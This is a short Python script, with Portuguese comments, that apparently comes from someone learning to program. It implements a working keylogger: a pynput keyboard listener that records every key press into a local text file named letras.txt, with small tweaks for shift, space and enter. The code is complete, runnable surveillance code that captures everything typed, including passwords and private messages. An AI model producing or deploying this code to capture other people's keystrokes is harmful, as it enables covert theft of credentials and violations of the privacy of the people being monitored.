# registrar as teclas em um arquivo de texto
# r - reading
# w - write sobre escreve o arquivo
# a - append adiciona ao texto  ( pular de linha '\n' antes ou depois da string)
# criar um arquivo

# eu ainda quero ver algum jeito mais elegante de registrar o backspace(apagar) pra deixar mais organizado

from pynput.keyboard import Listener

def write_to_file(key):
    letter = str(key)
    letter = letter.replace("'","") #tira as aspas ' q cria automaticamente

    if letter == "Key.shift": #ignora os registros do shift (meu teclado nao tem R and L shift)
        letter = ""
    if letter == "Key.space": #substitui a str Key.space por um espaço de fato
        letter = " "
    if letter == "Key.ctrl_l": # same
        letter = " "
    if letter == "Key.enter": #substitui o ENTER pelo comando de proxima linha
        letter = "\n"
    with open("letras.txt", 'a') as f:         #usando with por razoes de alocaão de memoria
        f.write(letter)

with Listener(on_press=write_to_file) as l:   # with; on_press ativa a função writetofile; as l verbaliza a linha para facilitar o uso
    l.join()